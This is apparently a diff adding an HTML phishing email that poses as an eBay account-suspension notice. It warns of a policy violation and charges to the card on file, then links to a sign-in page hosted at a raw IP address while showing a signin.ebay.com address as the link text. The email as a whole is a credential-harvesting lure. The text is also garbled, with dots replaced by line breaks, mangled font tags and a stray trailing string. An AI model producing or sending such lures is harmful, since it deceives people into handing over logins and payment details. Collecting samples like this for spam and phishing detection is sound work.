@@ -1,0 +1,35 @@
+<FONT face="Courier New" size=2>Dear eBay Community Member ,<BR><BR>We regret to inform you that your eBay account has been suspended due 
+to the violation of our site policy below:<BR><BR>False or missing contact information - Falsifying or omitting your 
+name, address, and/or telephone number (including use of fax machines pager numbers, modems or disconnected 
+numbers)
+<BR><BR>Due to the suspension of this account, please be advised you are prohibited from using eBay in any 
+way
+ This prohibition includes the registering of a new account
+<BR><BR>Please note that any seller fees due to eBay 
+will immediately become due and payable
+<BR>eBay will charge any amounts you have not previously disputed to the 
+billing method currently on file
+<BR><BR>If you would like your account to be considered for reinstatement, please 
+click on the link below, and provide us additional information
+<BR><BR><A 
+href="http://202
+64
+122
+136/eBaySuspension/signin
+ebay
+com/aw-cgi/eBayISAPI
+dllSignIn-ssPageName-hhsin
+php" 
+target=_blank><FONT face="Courier New" color=#003399 size=2 
+ fa
+ ce
+="
+&#10; Courier 
+New">http://signin
+ebay
+com/aw-cgi/eBayISAPI
+dll
+SignIn&amp;ssPageName=h:h:sin:US</FONT></A><BR><BR><FONT face="Courier 
+New" size=2>Regards,<BR><BR>eBay</FONT></FONT>
+
+nvkedz
